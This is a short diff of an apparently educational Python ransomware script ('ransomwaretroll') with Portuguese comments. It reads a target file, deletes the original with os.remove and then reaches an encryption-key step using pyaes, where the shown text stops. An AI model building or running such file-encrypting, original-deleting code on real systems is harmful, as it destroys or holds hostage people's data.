@@ -1,13 +1,15 @@
 import os
 import pyaes
 
+
+
 ## abrir o arquivo a ser criptografado
-file_name = "teste.txt.ransomwaretroll"
+file_name = "teste.txt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+## remover o arquivo Original
 os.remove(file_name)
 
 ## chave de criptografia
